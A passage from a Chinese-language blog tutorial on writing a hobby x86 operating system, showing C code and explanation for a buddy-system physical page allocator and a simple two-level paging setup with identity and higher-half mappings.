<span class="keyword">if</span> (p == <span class="literal">NULL</span>||order &gt; MAX_ORDER||!p-&gt;is_head) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == free_list[order].head) &#123;       <span class="comment">// 删除头节点</span></span><br><span class="line">        free_list[order].head = p-&gt;next;</span><br><span class="line">        free_list[order].count--;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Page* cur = free_list[order].head; cur-&gt;next; cur = cur-&gt;next)&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur-&gt;next == p) &#123;</span><br><span class="line">            cur-&gt;next = p-&gt;next;</span><br><span class="line">            free_list[order].count--;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Page* <span class="title function_">fetch_from_free_list</span><span class="params">(<span class="type">uint8_t</span> order)</span> &#123;         <span class="comment">// 从链表中获取指定阶的块，取链表头节点</span></span><br><span class="line">    <span class="keyword">if</span> (order &gt; MAX_ORDER) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (free_list[order].count==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;      <span class="comment">// 空链表</span></span><br><span class="line">    Page *p = free_list[order].head;</span><br><span class="line">    free_list[order].head = p-&gt;next;</span><br><span class="line">    free_list[order].count--;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_init</span><span class="params">(<span class="type">uint32_t</span> memory_map_addr)</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> entry_count = *(<span class="type">uint16_t</span>*)MEMORY_MAP_COUNT_ADDR;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MemoryMapEntry</span>* <span class="title">mmap</span> =</span> (<span class="keyword">struct</span> MemoryMapEntry*)memory_map_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 初始化所有页状态</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; MAX_PAGES; i++) &#123;</span><br><span class="line">        page_array[i].used = <span class="number">1</span>;  <span class="comment">// 默认全部占用</span></span><br><span class="line">        page_array[i].order = <span class="number">0</span>;</span><br><span class="line">        page_array[i].next = <span class="literal">NULL</span>;</span><br><span class="line">        page_array[i].is_head = <span class="number">0</span>;      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; MAX_ORDER; i++) &#123;</span><br><span class="line">        free_list[i].head = <span class="literal">NULL</span>;</span><br><span class="line">        free_list[i].count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 标记 memory map 中 type==1 的区域为可用（跳过第一个 entry，保留给内核）</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">extern</span> <span class="type">uint32_t</span> kernel_end;</span><br><span class="line">    <span class="type">uint32_t</span> kernel_pages = ((<span class="type">uint32_t</span>)&amp;kernel_end + PAGE_SIZE - <span class="number">1</span>) / PAGE_SIZE;        <span class="comment">// 内核使用的最大页号</span></span><br><span class="line">    kernel_printf(<span class="string">&quot;kernel_end: %x\n&quot;</span>, &amp;kernel_end);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">1</span>; i &lt; entry_count; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mmap[i].type != <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">uint32_t</span> base = mmap[i].base_addr;</span><br><span class="line">        <span class="type">uint32_t</span> length = mmap[i].length;</span><br><span class="line"></span><br><span class="line">        <span class="type">uint32_t</span> start_page = base / PAGE_SIZE;</span><br><span class="line">        <span class="type">uint32_t</span> end_page = (base + length) / PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> j = start_page; j &lt; end_page &amp;&amp; j &lt; MAX_PAGES; ) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; kernel_pages) &#123;</span><br><span class="line">                j = kernel_pages;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">uint32_t</span> order = MAX_ORDER;</span><br><span class="line">            <span class="keyword">while</span> (order &gt; <span class="number">0</span>) &#123;                 <span class="comment">// 从最大阶开始，找到第一个可以分配的块</span></span><br><span class="line">                <span class="type">uint32_t</span> block_size = <span class="number">1</span> &lt;&lt; order;</span><br><span class="line">                <span class="keyword">if</span> (j % block_size == <span class="number">0</span> &amp;&amp; j + block_size &lt;= end_page) <span class="keyword">break</span>;       <span class="comment">// 模除保证对齐</span></span><br><span class="line">                order--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            page_array[j].order = order;</span><br><span class="line">            page_array[j].used = <span class="number">0</span>;</span><br><span class="line">            page_array[j].is_head = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 头部插入新节点，最后插入链表的节点在分配时最先获取</span></span><br><span class="line">            add_to_free_list(&amp;page_array[j], order);</span><br><span class="line"></span><br><span class="line">            j += (<span class="number">1</span> &lt;&lt; order);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">pmm_get_order</span><span class="params">(<span class="type">uint32_t</span> count)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint8_t</span> i = <span class="number">0</span>; i &lt;= MAX_ORDER; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count &lt;= (<span class="number">1</span> &lt;&lt; i)) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    panic(<span class="string">&quot;pmm_get_order: too many pages requested&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">pmm_alloc_pages</span><span class="params">(<span class="type">uint32_t</span> count)</span> &#123;     <span class="comment">// 申请 count 个页</span></span><br><span class="line">    <span class="type">uint8_t</span> order = pmm_get_order(count);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint8_t</span> current_order = order; current_order &lt;= MAX_ORDER; current_order++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (free_list[current_order].count &gt; <span class="number">0</span>) &#123;         <span class="comment">// 可以找到合适的块</span></span><br><span class="line">            Page* block = fetch_from_free_list(current_order);      <span class="comment">// 取出链表头节点</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 拆分直到需要的 order,多余的块加回链表</span></span><br><span class="line">            <span class="keyword">while</span> (current_order &gt; order) &#123;</span><br><span class="line">                current_order--;</span><br><span class="line">                Page* buddy = &amp;page_array[block - page_array + (<span class="number">1</span> &lt;&lt; current_order)];   <span class="comment">// 后半段</span></span><br><span class="line">                buddy-&gt;order = current_order;</span><br><span class="line">                buddy-&gt;used = <span class="number">0</span>;</span><br><span class="line">                buddy-&gt;is_head = <span class="number">1</span>;</span><br><span class="line">                <span class="comment">// 将拆出来的较小的块加入链表</span></span><br><span class="line">                add_to_free_list(buddy, current_order);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            block-&gt;used = <span class="number">1</span>;</span><br><span class="line">            block-&gt;order = order;</span><br><span class="line">            block-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="comment">// block-&gt;is_head = 1;   取出的可以保证一定是块起点</span></span><br><span class="line">            <span class="keyword">return</span> (<span class="type">void</span>*)((block - page_array) * PAGE_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">// 分配失败</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">pmm_alloc_page</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> pmm_alloc_pages(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_free_page</span><span class="params">(Page* p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || p-&gt;used == <span class="number">0</span> || p-&gt;is_head == <span class="number">0</span>) panic(<span class="string">&quot;pmm_free_page: invalid page&quot;</span>);</span><br><span class="line">    <span class="type">uint8_t</span> order = p-&gt;order;</span><br><span class="line">    p-&gt;used = <span class="number">0</span>;</span><br><span class="line">    p-&gt;next = free_list[order].head;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> page_idx = p - page_array;         <span class="comment">// 计算页号</span></span><br><span class="line">    <span class="keyword">while</span> (order &lt; MAX_ORDER) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> buddy_idx = page_idx ^ (<span class="number">1</span> &lt;&lt; order);        <span class="comment">// 找到可能进行合并的相邻块</span></span><br><span class="line">        Page* buddy = &amp;page_array[buddy_idx];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 buddy 也空闲，并且在同一阶，且对齐正确</span></span><br><span class="line">        <span class="keyword">if</span> (!buddy-&gt;used &amp;&amp; buddy-&gt;order == order) &#123;</span><br><span class="line">            <span class="comment">// 从该阶链表中移除 buddy</span></span><br><span class="line">            remove_from_free_list(buddy, order);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 合并：取较小页号为新块的起点</span></span><br><span class="line">            <span class="keyword">if</span> (buddy_idx &lt; page_idx) &#123;</span><br><span class="line">                p-&gt;is_head = <span class="number">0</span>;     <span class="comment">// 标记为非块起点</span></span><br><span class="line">                page_idx = buddy_idx;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                buddy-&gt;is_head = <span class="number">0</span>;     <span class="comment">// 标记为非块起点</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            order++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 无法合并，停止</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最终将合并后块加入 free_list[order]</span></span><br><span class="line">    Page* merged_page = &amp;page_array[page_idx];</span><br><span class="line">    merged_page-&gt;used = <span class="number">0</span>;</span><br><span class="line">    merged_page-&gt;order = order;</span><br><span class="line">    merged_page-&gt;is_head = <span class="number">1</span>;</span><br><span class="line">    add_to_free_list(merged_page, order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_print_info</span><span class="params">()</span>&#123;</span><br><span class="line">    kernel_printf(<span class="string">&quot;pmm info:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt;= MAX_ORDER; i++)&#123;</span><br><span class="line">        kernel_printf(<span class="string">&quot;size %d (%d): &quot;</span>, <span class="number">1</span> &lt;&lt; i, free_list[i].count);</span><br><span class="line">        <span class="type">uint32_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Page* p = free_list[i].head; p; p = p-&gt;next)&#123;   </span><br><span class="line">            <span class="keyword">if</span> (cnt&gt;=<span class="number">7</span>) &#123;      <span class="comment">// 显示前7个</span></span><br><span class="line">                kernel_printf(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;   </span><br><span class="line">            &#125;      </span><br><span class="line">            cnt++;</span><br><span class="line">            kernel_printf(<span class="string">&quot;%x -&gt; &quot;</span>, (p - page_array)* PAGE_SIZE);       <span class="comment">// 输出地址</span></span><br><span class="line">        &#125;</span><br><span class="line">        kernel_printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><strong>buddy判断</strong></p>
<p>假设你有一个块从页号 <code>page_idx</code> 开始，大小为
<code>2^order</code>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint32_t</span> buddy_idx = page_idx ^ (<span class="number">1</span> &lt;&lt; order);</span><br></pre></td></tr></table></figure></div>
<p>这个异或操作就是计算 buddy 的位置。</p>
<ul>
<li>例如：<code>page_idx = 8</code>, <code>order = 2</code>（块大小 4）
<ul>
<li><code>buddy_idx = 8 ^ 4 = 12</code>，所以 <code>8~11</code>
是一个块，它的 buddy 是 <code>12~15</code></li>
</ul></li>
</ul>
<p>最后在kernel.c中添加如下内容进行测试是否可以正确维护链表。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">clear_screen();         <span class="comment">// 清屏</span></span><br><span class="line"><span class="comment">// print_string(&quot;Hello, Kernel!\n&quot;);  // 打印一行字符</span></span><br><span class="line">print_memory_map();</span><br><span class="line">idt_install();</span><br><span class="line">irq_remap();</span><br><span class="line">isr_install();</span><br><span class="line">irq_install();</span><br><span class="line"></span><br><span class="line">pmm_init(MEMORY_MAP_ADDR);      <span class="comment">// 初始化物理内存管理</span></span><br><span class="line">pmm_print_info();</span><br></pre></td></tr></table></figure></div>
<p>这里我们通过在<strong>make run</strong>对应的指令中加入-m
x就可以指定给虚拟机分配的内存。并把头文件的<strong>MAX_PAGES</strong>宏设置为512MB对应的页数。然后跑起来后就能看到有很多1024的块，计算后也很接近512MB。正常工作！</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8-%E7%AE%80%E5%8D%95%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20250518235419035.png"
                      class=""
                >
<h3 id="简单分页机制实现">简单分页机制实现</h3>
<h4 id="虚拟地址映射">虚拟地址映射</h4>
<p>由于我们设计的是32位的操作系统，所以这里用到的是两级页表。由于一页的大小是<strong>0x1000</strong>，32位下一个地址占4字节，所以一个页表下能存
<span class="math inline">\(4096/4=1024=2^{10}\)</span>
这么多地址，如果这个页表里面用来存下一级页表的地址，就可以构成二级页表。由于我们要把一个32位的虚拟地址映射成为物理地址，我们需要索引到一个页表的项的下标，需要用掉10位，最后的12位又需要保留作为页内的偏移。所以实际上我们的物理地址可以拆分为<code>10-bit 页目录索引</code>
+ <code>10-bit 页表索引</code> +
<code>12-bit 页内偏移</code>进行映射，而且最多只能用到二级页表。最多能映射
<span class="math inline">\(2^{20} 页 × 2^{12} 字节 = 2^{32} 字节 =
4GB\)</span> 的内存。</p>
<p>实际上我们的地址翻译最终是由硬件进行实现的，在x86架构下，我们需要做的是把页目录设置好后，将其地址加载进<strong>cr3</strong>寄存器，然后最后设置好<strong>cr0</strong>寄存器的值，打开分页功能。这里我们需要知道的是，硬件需要事先知道页表结构分为了几级，之后才可以正确翻译地址。分页结构由
CPU 模式决定：</p>
<table>
<colgroup>
<col style="width: 44%" />
<col style="width: 10%" />
<col style="width: 17%" />
<col style="width: 27%" />
</colgroup>
<thead>
<tr>
<th>模式</th>
<th>名称</th>
<th>特征</th>
<th>页表结构</th>
</tr>
</thead>
<tbody>
<tr>
<td>实模式</td>
<td>无分页</td>
<td>20位地址（1MB）</td>
<td>无页表</td>
</tr>
<tr>
<td><strong>保护模式 (32位)</strong></td>
<td>分页模式</td>
<td>CR0.PG=1</td>
<td><strong>两级页表（10+10+12）</strong></td>
</tr>
<tr>
<td><strong>PAE 模式 (Physical Address Extension)</strong></td>
<td>高地址分页</td>
<td>启用 CR4.PAE=1</td>
<td>三级页表</td>
</tr>
<tr>
<td><strong>长模式 (64位)</strong></td>
<td>64位分页</td>
<td>启用 IA-32e 模式</td>
<td><strong>四级页表（9+9+9+9+12）</strong></td>
</tr>
</tbody>
</table>
<p>而页表项（Page Table
Entry）中也包含一系列的控制位，硬件最后会根据控制位来确定其行为，比如对一个只读的内存写入就会触发<strong>Page
Fault</strong> 缺页异常。32位下常见的控制位如下：</p>
<table>
<colgroup>
<col style="width: 6%" />
<col style="width: 34%" />
<col style="width: 59%" />
</colgroup>
<thead>
<tr>
<th>位数</th>
<th>名称</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>P（Present）</td>
<td>页面是否存在</td>
</tr>
<tr>
<td>1</td>
<td>R/W（Read/Write）</td>
<td><code>0</code> = 只读，<code>1</code> = 可读可写</td>
</tr>
<tr>
<td>2</td>
<td>U/S（User/Supervisor）</td>
<td><code>0</code> = 仅内核访问，<code>1</code> = 用户态也可访问</td>
</tr>
<tr>
<td>3</td>
<td>PWT</td>
<td>Page-level Write-Through</td>
</tr>
<tr>
<td>4</td>
<td>PCD</td>
<td>Page-level Cache Disable</td>
</tr>
<tr>
<td>5</td>
<td>A（Accessed）</td>
<td>是否被访问过</td>
</tr>
<tr>
<td>6</td>
<td>D（Dirty）</td>
<td>是否被写过（仅在页表中）</td>
</tr>
</tbody>
</table>
<p>然后就可以开始着手实现我们的分页机制。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memory/vmm.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_PRESENT   0x1     <span class="comment">// 页存在</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_RW        0x2     <span class="comment">// 可读写</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_USER      0x4     <span class="comment">// 用户态</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_FLAGS     (PAGE_PRESENT | PAGE_RW)  <span class="comment">// 默认属性</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE      0x1000  <span class="comment">// 4KB</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_ENTRIES   1024    <span class="comment">// 每个页表/目录有 1024 项</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> <span class="type">page_entry_t</span>;  <span class="comment">// 页目录项或页表项</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">page_entry_t</span> entries[PAGE_ENTRIES];</span><br><span class="line">&#125; __attribute__((aligned(PAGE_SIZE))) <span class="type">page_table_t</span>;     <span class="comment">// 页表</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vmm_init</span><span class="params">()</span>;        <span class="comment">// 初始化虚拟内存管理</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">map_page</span><span class="params">(<span class="type">uint32_t</span> virt_addr, <span class="type">uint32_t</span> phys_addr, <span class="type">uint32_t</span> flags)</span>;      <span class="comment">// 映射页</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memory/vmm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;printf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="type">page_table_t</span>* kernel_page_directory __attribute__((aligned(PAGE_SIZE)));</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vmm_init</span><span class="params">()</span> &#123;</span><br><span class="line">    kernel_page_directory = (<span class="type">page_table_t</span>*)pmm_alloc_page();</span><br><span class="line">    <span class="keyword">if</span> (kernel_page_directory == <span class="number">0</span>) &#123;</span><br><span class="line">        kernel_printf(<span class="string">&quot;vmm_init: failed to allocate page directory\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(kernel_page_directory, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个页表：映射 0x00000000 - 0x00400000, 前4MB恒等映射，虚拟地址就为物理地址</span></span><br><span class="line">    <span class="type">page_table_t</span>* identity_pt = (<span class="type">page_table_t</span>*)pmm_alloc_page();</span><br><span class="line">    <span class="built_in">memset</span>(identity_pt, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; PAGE_ENTRIES; i++) &#123;</span><br><span class="line">        identity_pt-&gt;entries[i] = (i * PAGE_SIZE) | PAGE_FLAGS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 页目录第 0 项 → 恒等映射</span></span><br><span class="line">    kernel_page_directory-&gt;entries[<span class="number">0</span>] = ((<span class="type">uint32_t</span>)identity_pt) | PAGE_FLAGS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 页目录第 768 项 → 高地址映射：0xC0000000 起点（768*4MB）</span></span><br><span class="line">    kernel_page_directory-&gt;entries[<span class="number">768</span>] = ((<span class="type">uint32_t</span>)identity_pt) | PAGE_FLAGS;</span><br><span class="line"></span><br><span class="line">    enable_paging(kernel_page_directory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">enable_paging</span><span class="params">(<span class="type">page_table_t</span>* kernel_page_directory)</span> &#123;</span><br><span class="line">    <span class="comment">// 设置页目录</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %0, %%cr3&quot;</span> :: <span class="string">&quot;r&quot;</span> (kernel_page_directory))</span>;</span><br><span class="line">    <span class="comment">// 开启分页</span></span><br><span class="line">    <span class="type">uint32_t</span> cr0;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %%cr0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (cr0))</span>;</span><br><span class="line">    cr0 |= <span class="number">0x80000000</span>;  <span class="comment">// 设置PG位,开两级页表</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %0, %%cr0&quot;</span> :: <span class="string">&quot;r&quot;</span> (cr0))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">map_page</span><span class="params">(<span class="type">uint32_t</span> virt_addr, <span class="type">uint32_t</span> phys_addr, <span class="type">uint32_t</span> flags)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> pd_index = virt_addr &gt;&gt; <span class="number">22</span>;             <span class="comment">// 前10位,页目录索引</span></span><br><span class="line">    <span class="type">uint32_t</span> pt_index = (virt_addr &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x03FF</span>;  <span class="comment">// 中间10位，页表索引</span></span><br><span class="line"></span><br><span class="line">    <span class="type">page_table_t</span>* page_table;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取页目录项</span></span><br><span class="line">    <span class="keyword">if</span> (!(kernel_page_directory-&gt;entries[pd_index] &amp; PAGE_PRESENT)) &#123;</span><br><span class="line">        <span class="comment">// 页目录项不存在，分配一个页目录</span></span><br><span class="line">        page_table = (<span class="type">page_table_t</span>*)pmm_alloc_page();</span><br><span class="line">        <span class="built_in">memset</span>(page_table, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">        kernel_page_directory-&gt;entries[pd_index] =</span><br><span class="line">            ((<span class="type">uint32_t</span>)page_table) | flags | PAGE_PRESENT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 页目录已存在</span></span><br><span class="line">        page_table = (<span class="type">page_table_t</span>*)(kernel_page_directory-&gt;entries[pd_index] &amp; <span class="number">0xFFFFF000</span>);       <span class="comment">// 需要去除最后的flag位</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置页表项</span></span><br><span class="line">    <span class="keyword">if</span> (!(page_table-&gt;entries[pt_index] &amp; PAGE_PRESENT)) &#123;          <span class="comment">// 不存在对应页表项</span></span><br><span class="line">        page_table-&gt;entries[pt_index] = (phys_addr &amp; <span class="number">0xFFFFF000</span>) | flags | PAGE_PRESENT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 可加日志：虚拟地址重复映射</span></span><br><span class="line">        kernel_printf(<span class="string">&quot;map_page: virt_addr %x already exists\n&quot;</span>, virt_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 性能优化：TLB刷新只刷新单页（如果支持）</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;invlpg (%0)&quot;</span> :: <span class="string">&quot;r&quot;</span> (virt_addr) : <span class="string">&quot;memory&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unmap_page</span><span class="params">(<span class="type">page_table_t</span>* pd, <span class="type">uint32_t</span> virt_addr)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> pd_idx = (virt_addr &gt;&gt; <span class="number">22</span>) &amp; <span class="number">0x3FF</span>;</span><br><span class="line">    <span class="type">uint32_t</span> pt_idx = (virt_addr &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3FF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">page_table_t</span>* pt = (<span class="type">page_table_t</span>*)(pd-&gt;entries[pd_idx] &amp; <span class="number">0xFFFFF000</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pt) <span class="keyword">return</span>; <span class="comment">// 页表不存在</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> entry = pt-&gt;entries[pt_idx];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (entry &amp; PAGE_PRESENT) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> phys_addr = entry &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 取消页表项</span></span><br><span class="line">        pt-&gt;entries[pt_idx] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 归还物理页</span></span><br><span class="line">        pmm_free_page(phys_addr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 刷新 TLB（防止虚地址缓存未失效）</span></span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;invlpg (%0)&quot;</span> :: <span class="string">&quot;r&quot;</span> (virt_addr) : <span class="string">&quot;memory&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里的页目录和页表所占用的页都由之前实现的<strong>pmm</strong>来进行分配，其中初始化时我们将第一个页目录项下的所有页表进行恒等映射，也就是虚拟地址映射到相同的物理地址，这样前4MB内存建立了恒等映射后，我们刚切换成页表模式后，就不会因为执行下一个指令而立即触发缺页异常。之后我们往高地址<strong>0xC0000000</strong>处也映射了前4MB内存，这方便我们后续跳转到高虚拟地址处执行，取消掉前面4MB的恒等映射。</p>
<p>这样当我们执行完<strong>vmm_init</strong>切换页表后，仍然可以在低地址处正常执行下一个指令，而且在虚拟地址高地址处也可以正确解析到对应代码。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8-%E7%AE%80%E5%8D%95%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20250512105214571.png"
                      class=""
                >
<h4 id="panic实现">panic实现</h4>
<p>为了后续我们缺页异常处理时遇到一些错误情况可以直接停止系统运行，这里先实现一个panic函数，可以打印错误信息，后续可以扩展到打印当前堆栈。</p>
